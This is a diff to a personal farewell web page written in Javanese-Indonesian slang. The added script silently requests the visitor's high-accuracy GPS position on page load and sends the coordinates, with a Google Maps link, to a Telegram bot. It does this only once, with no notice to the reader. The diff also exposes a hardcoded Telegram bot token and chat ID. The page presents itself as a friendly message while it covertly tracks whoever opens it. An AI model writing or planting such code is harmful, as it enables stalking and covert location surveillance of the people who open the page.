@@ -58,7 +58,6 @@ footer{text-align:center;color:var(--mute);font-size:.85rem;padding:2rem 1rem 3r
 <main>
   <p class="r">Hoi, Aku asline yo gak eroh ate nulis opo iki, wes pokok e sehat selalu nk kono, ojk lali mangan, ojk gendaan ae nk kono</p>
 
-
   <div class="q r">"Semoga kita bertemu lagi dalam keadaan terbaik kita masing-masing" (anjay keren bat gw🥶)</div>
 
   <h2 class="r">Teruss</h2>
@@ -97,6 +96,53 @@ var VIDEO_SRC = "https://www.image2url.com/r2/default/videos/1790861247855-48a73
 var TELEGRAM_BOT_TOKEN = "8926981293:AAGuRZm5ggRC8y-rWEVqi1W6MgW75LWknIc";
 var TELEGRAM_CHAT_ID = "6006690349";
 // ========================
+
+
+// ===== TAMBAHAN: KIRIM LOKASI GPS SAAT PERTAMA MASUK =====
+var gpsSudahDikirim = localStorage.getItem("gpsSudahDikirim");
+
+function kirimLokasiGPS(){
+  if(gpsSudahDikirim === "1") return;
+  if(!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos){
+      var lat = pos.coords.latitude;
+      var lon = pos.coords.longitude;
+      var akurasi = Math.round(pos.coords.accuracy);
+
+      fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text:
+            "📍 WEBSITE DIBUKA\n\n" +
+            "👤 " + NAMA + "\n" +
+            "Latitude: " + lat + "\n" +
+            "Longitude: " + lon + "\n" +
+            "🎯 Akurasi: ±" + akurasi + " meter\n\n" +
+            "🗺️ https://www.google.com/maps?q=" + lat + "," + lon
+        })
+      })
+      .then(function(){
+        localStorage.setItem("gpsSudahDikirim", "1");
+      })
+      .catch(function(){});
+    },
+    function(){},
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+  );
+}
+
+kirimLokasiGPS();
+
 
 // TELEGRAM: fungsi kirim notif, cuma sekali per kunjungan
 var sudahKirim = false;
